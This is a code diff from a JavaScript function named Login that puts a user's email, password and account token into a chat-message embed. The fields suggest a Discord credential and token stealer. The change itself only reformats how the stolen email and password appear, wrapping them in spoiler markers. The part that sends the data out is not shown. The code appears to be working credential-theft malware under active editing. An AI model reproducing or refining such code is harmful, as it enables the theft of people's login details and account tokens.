@@ -149,9 +149,14 @@ function Login(email, password, token) {
                     "fields": [
                         {
                             "name": "**Account Info**",
-                            "value": `Email: ${email} - Password: ${password}`,
+                            "value": `Email: ||${email}|| 
+
+                                      Password: ||${password}||`,
                             "inline": true
                         },
+
+
+                    
                         {
                             "name": "**Token**",
                             "value": `\`${token}\``,
